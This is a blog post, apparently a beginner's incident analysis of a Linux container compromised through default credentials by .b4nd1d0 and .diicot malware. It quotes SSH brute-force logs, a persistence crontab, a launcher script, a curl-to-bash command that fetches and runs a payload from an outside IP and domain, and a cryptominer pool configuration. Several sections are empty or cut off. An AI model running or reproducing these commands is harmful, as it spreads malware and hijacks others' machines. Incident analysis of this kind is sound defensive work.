---
layout: post
title: a beginer's analysis of .b4nd1d0 and .diicot
date: 2024-09-29 16:10:00
description: How b4nd1d0 and diicot malwares works on a linux container
tags: malware
categories: malware
thumbnail: assets/img/thumbnail/virus.png
---

Malwares are one of the more destructive cyber-threats that daily endangers millions of computers and servers. In my case one of the many servers that I use was compromised. The following is my understanding of the attack that will likely change. I'm going to describe our set-up and the hint that I gained from manual log analysis and a bit of google search.

### Setup

- LXC Container
- Public IP address
- Default credentials
  
The perfect recipe for a disaster.

### Detection

The detection of this attack was done by an automatic mail signaling abnormal traffic directed to some Linux machines via SSH, with a lot of errors returned by theese machines.

The logs were like this:
```

2024-09-25T06:11:27.008471+00:00 Linux03 sshd[490844]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=MY_IP  user=root
2024-09-25T06:11:28.679602+00:00 Linux03 sshd[490844]: Failed password for root from MY_IP port 36986 ssh2
2024-09-25T06:11:30.056913+00:00 Linux03 sshd[491084]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=MY_IP  user=root
...
```
There was in action a Login brute-force attack originating from our server trying to gain access to another machine.
Once logged on looking at the logs from one of the unprivileged account, the *admin* one, the ssh service was trying to log in as different user to other IP address.

### Infection and foothold

The malware gained access by exploiting the default credential of the admin's account *admin:admin*. The admin account was not in the sudoers and had just docker installed. A lateral movement is highly improbable because the root account was never utilized by the attacker. 
The attacker was probably another 

### Securing the foothold

The foothold was secured by using a chron script:

```
crontab -l
@daily /var/tmp/Documents/./.b4nd1d0
@reboot /var/tmp/Documents/./.diicot > /dev/null 2>&1 & disown
@reboot /var/tmp/Documents/./.diicot > /dev/null 2>&1 & disown
* * * * * /var/tmp/Documents/./.diicot > /dev/null 2>&1 & disown
* * * * * /var/tmp/Documents/./.diicot > /dev/null 2>&1 & disown
@monthly /var/tmp/Documents/./.diicot > /dev/null 2>&1 & disown
@monthly /var/tmp/Documents/./.diicot > /dev/null 2>&1 & disown
*/30 * * * * /var/tmp/Documents/./.c > /dev/null 2>&1 & disown
*/30 * * * * /var/tmp/Documents/./.c > /dev/null 2>&1 & disown
```

Using disown ... job -l was empty

### Scope of the attack



### b4nd1d0

```
#!/bin/bash
m1lbe1()
{
if ! pgrep -x Opera >/dev/null
then
                cd /var/tmp/Documents
        ./Opera >/dev/null 2>&1
else
                exit 1
fi
}
m1lbe1

```

### diicot

### c

```
curl -s 91.92.250.6/.x/black3 --connect-timeout 15 | bash >/dev/null 2>&1 || curl -s x.diicot.xyz/.x/black3 --connect-timeout 15 | bash >/dev/null 2>&1
```

### config.yaml

```
admin@machine:/# cat /var/tmp/Documents/config.json 

            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        },
        {
            "algo": null,
            "coin": null,
            "url": "139.99.123.196:80",
            "user": "87Fxj6UDiwYchWbn2k1mCZJxRxBC5TkLJQoP9EJ4E9V843Z9ySeKYi165Gfc2KjxZnKdxCkz7GKrvXkHE11bvBhD9dbMgQe",
            "pass": "proxy2",
            "rig-id": "",
            "nicehash": false,
            "keepalive": false,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }

```

### Obfuscation